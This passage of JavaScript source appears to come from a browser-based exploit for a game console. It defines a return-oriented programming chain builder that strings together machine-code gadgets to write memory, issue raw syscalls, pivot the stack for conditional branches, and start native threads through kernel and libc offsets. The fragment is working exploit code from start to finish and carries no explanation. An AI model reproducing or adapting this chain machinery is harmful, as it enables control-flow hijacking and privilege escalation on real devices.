    this.push(gadgets["pop rdi"]);
    this.push(where);
    this.push(gadgets["mov [rdi], rax"]);
  }
  this.write_result4 = function (where) {
    this.push(gadgets["pop rdi"]);
    this.push(where);
    this.push(gadgets["mov [rdi], eax"]);
  }
  
  //use this in loops.
  this.syscall_safe = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
    if (rdi != undefined) {
      this.push(gadgets["pop rdi"]);
      this.push(rdi);
    }

    if (rsi != undefined) {
      this.push(gadgets["pop rsi"]);
      this.push(rsi);
    }

    if (rdx != undefined) {
      this.push(gadgets["pop rdx"]);
      this.push(rdx);
    }

    if (rcx != undefined) {
      this.push(gadgets["pop rcx"]);
      this.push(rcx);
    }

    if (r8 != undefined) {
      this.push(gadgets["pop r8"]);
      this.push(r8);
    }

    if (r9 != undefined) {
      this.push(gadgets["pop r9"]);
      this.push(r9);
    }
    var sysc_restore = this.get_rsp();
    this.push(window.syscalls[sysc]);
    this.push_write8(sysc_restore, window.syscalls[sysc]);
  }
  this.jmp_rsp = function (rsp) {
    this.push(window.gadgets["pop rsp"]);
    this.push(rsp);
  }
  
  this.create_equal_branch = function (value_addr, compare_value) {
    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
    this.branches_count++;

    this.push(window.gadgets["pop rax"]);
    this.push(0);
    this.push(window.gadgets["pop rcx"]);
    this.push(value_addr);
    this.push(window.gadgets["pop rdi"]);
    this.push(compare_value);
    this.push(window.gadgets["cmp [rcx], edi"]);
    this.push(window.gadgets["setne al"]);
    this.push(window.gadgets["shl rax, 3"]);
    this.push(window.gadgets["pop rdx"]);
    this.push(branch_addr_spc);
    this.push(window.gadgets["add rax, rdx"]);
    this.push(window.gadgets["mov rax, [rax]"]);
    this.push(window.gadgets["pop rdi"]);
    var a  = this.pushSymbolic();
    this.push(window.gadgets["mov [rdi], rax"]);
    this.push(window.gadgets["pop rsp"]);
    var b = this.get_rsp();
    this.push(0x41414141);

    this.finalizeSymbolic(a, b);

    return branch_addr_spc;

  }
  this.create_greater_branch = function (value_addr, compare_value) {
    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
    this.branches_count++;

    this.push(window.gadgets["pop rax"]);
    this.push(0);
    this.push(window.gadgets["pop rcx"]);
    this.push(value_addr);
    this.push(window.gadgets["pop rdi"]);
    this.push(compare_value);
    this.push(window.gadgets["cmp [rcx], edi"]);
    this.push(window.gadgets["setle al"]);
    this.push(window.gadgets["shl rax, 3"]);
    this.push(window.gadgets["pop rdx"]);
    this.push(branch_addr_spc);
    this.push(window.gadgets["add rax, rdx"]);
    this.push(window.gadgets["mov rax, [rax]"]);
    this.push(window.gadgets["pop rdi"]);
    var a  = this.pushSymbolic();
    this.push(window.gadgets["mov [rdi], rax"]);
    this.push(window.gadgets["pop rsp"]);
    var b = this.get_rsp();
    this.push(0x41414141);

    this.finalizeSymbolic(a, b);

    return branch_addr_spc;
  }
  this.create_greater_or_equal_branch = function (value_addr, compare_value) {
    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
    this.branches_count++;

    this.push(window.gadgets["pop rax"]);
    this.push(0);
    this.push(window.gadgets["pop rcx"]);
    this.push(value_addr);
    this.push(window.gadgets["pop rdi"]);
    this.push(compare_value);
    this.push(window.gadgets["cmp [rcx], edi"]);
    this.push(window.gadgets["setl al"]);
    this.push(window.gadgets["shl rax, 3"]);
    this.push(window.gadgets["pop rdx"]);
    this.push(branch_addr_spc);
    this.push(window.gadgets["add rax, rdx"]);
    this.push(window.gadgets["mov rax, [rax]"]);
    this.push(window.gadgets["pop rdi"]);
    var a  = this.pushSymbolic();
    this.push(window.gadgets["mov [rdi], rax"]);
    this.push(window.gadgets["pop rsp"]);
    var b = this.get_rsp();
    this.push(0x41414141);

    this.finalizeSymbolic(a, b);

    return branch_addr_spc;
  }
  this.create_lesser_branch = function (value_addr, compare_value) {
    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
    this.branches_count++;

    this.push(window.gadgets["pop rax"]);
    this.push(0);
    this.push(window.gadgets["pop rcx"]);
    this.push(value_addr);
    this.push(window.gadgets["pop rdi"]);
    this.push(compare_value);
    this.push(window.gadgets["cmp [rcx], edi"]);
    this.push(window.gadgets["setge al"]);
    this.push(window.gadgets["shl rax, 3"]);
    this.push(window.gadgets["pop rdx"]);
    this.push(branch_addr_spc);
    this.push(window.gadgets["add rax, rdx"]);
    this.push(window.gadgets["mov rax, [rax]"]);
    this.push(window.gadgets["pop rdi"]);
    var a  = this.pushSymbolic();
    this.push(window.gadgets["mov [rdi], rax"]);
    this.push(window.gadgets["pop rsp"]);
    var b = this.get_rsp();
    this.push(0x41414141);

    this.finalizeSymbolic(a, b);

    return branch_addr_spc;
  }
  this.create_lesser_or_equal_branch = function (value_addr, compare_value) {
    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
    this.branches_count++;

    this.push(window.gadgets["pop rax"]);
    this.push(0);
    this.push(window.gadgets["pop rcx"]);
    this.push(value_addr);
    this.push(window.gadgets["pop rdi"]);
    this.push(compare_value);
    this.push(window.gadgets["cmp [rcx], edi"]);
    this.push(window.gadgets["setg al"]);
    this.push(window.gadgets["shl rax, 3"]);
    this.push(window.gadgets["pop rdx"]);
    this.push(branch_addr_spc);
    this.push(window.gadgets["add rax, rdx"]);
    this.push(window.gadgets["mov rax, [rax]"]);
    this.push(window.gadgets["pop rdi"]);
    var a  = this.pushSymbolic();
    this.push(window.gadgets["mov [rdi], rax"]);
    this.push(window.gadgets["pop rsp"]);
    var b = this.get_rsp();
    this.push(0x41414141);

    this.finalizeSymbolic(a, b);

    return branch_addr_spc;
  }
  this.set_branch_points = function (branch_addr_sp, rsp_condition_met, rsp_condition_not_met) {
    p.write8(branch_addr_sp.add32(0x0), rsp_condition_met);
    p.write8(branch_addr_sp.add32(0x8), rsp_condition_not_met);
  }
  this.spawn_thread = function(name, chain_setup) {
    var new_thr = new rop();
    var context = p.malloc(0x100);

    p.write8(context.add32(0x0), window.gadgets["ret"]);
    p.write8(context.add32(0x10), new_thr.stack);
    new_thr.push(window.gadgets["ret"]);
    chain_setup(new_thr);

    var retv = function () {
      chain.call(libKernelBase.add32(OFFSET_lk_pthread_create_name_np), context.add32(0x48), 0, libSceLibcInternalBase.add32(OFFSET_libcint_longjmp), context, p.stringify(name));
    }
    window.nogc.push(new_thr);
    window.nogc.push(context);

    return retv;
  }

  this.run = function () {
    p.launch_chain(this);
    this.clear();
  }

  return this;
};